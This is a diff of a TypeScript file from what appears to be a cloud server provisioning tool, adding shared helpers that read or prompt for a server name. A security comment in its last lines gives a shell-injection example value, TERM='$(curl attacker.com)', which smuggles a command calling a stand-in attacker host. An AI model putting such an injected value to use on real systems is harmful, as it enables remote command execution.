@@ -295,6 +295,52 @@ export function defaultSpawnName(): string {
   return `spawn-${suffix}`;
 }
 
+/**
+ * Get server name from a cloud-specific env var, falling back to SPAWN_NAME_KEBAB / defaultSpawnName.
+ * Every cloud module had an identical copy of this logic — now unified here.
+ */
+export function getServerNameFromEnv(cloudEnvVar: string): string {
+  const cloudName = process.env[cloudEnvVar];
+  if (cloudName) {
+    if (!validateServerName(cloudName)) {
+      logError(`Invalid ${cloudEnvVar}: '${cloudName}'`);
+      throw new Error("Invalid server name");
+    }
+    logInfo(`Using server name from environment: ${cloudName}`);
+    return cloudName;
+  }
+
+  const kebab = process.env.SPAWN_NAME_KEBAB || (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "");
+  return kebab || defaultSpawnName();
+}
+
+/**
+ * Prompt user for a spawn name (or derive it non-interactively).
+ * Every cloud module had an identical copy of this logic — now unified here.
+ *
+ * @param cloudLabel - Display label for the prompt (e.g. "AWS instance", "Hetzner server")
+ */
+export async function promptSpawnNameShared(cloudLabel: string): Promise<void> {
+  if (process.env.SPAWN_NAME_KEBAB) {
+    return;
+  }
+
+  let kebab: string;
+  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
+    kebab = (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "") || defaultSpawnName();
+  } else {
+    const derived = process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "";
+    const fallback = derived || defaultSpawnName();
+    process.stderr.write("\n");
+    const answer = await prompt(`${cloudLabel} name [${fallback}]: `);
+    kebab = toKebabCase(answer || fallback) || defaultSpawnName();
+  }
+
+  process.env.SPAWN_NAME_DISPLAY = kebab;
+  process.env.SPAWN_NAME_KEBAB = kebab;
+  logInfo(`Using resource name: ${kebab}`);
+}
+
 /** Sanitize TERM value before interpolating into shell commands.
  *  SECURITY: Prevents shell injection via malicious TERM env vars
  *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
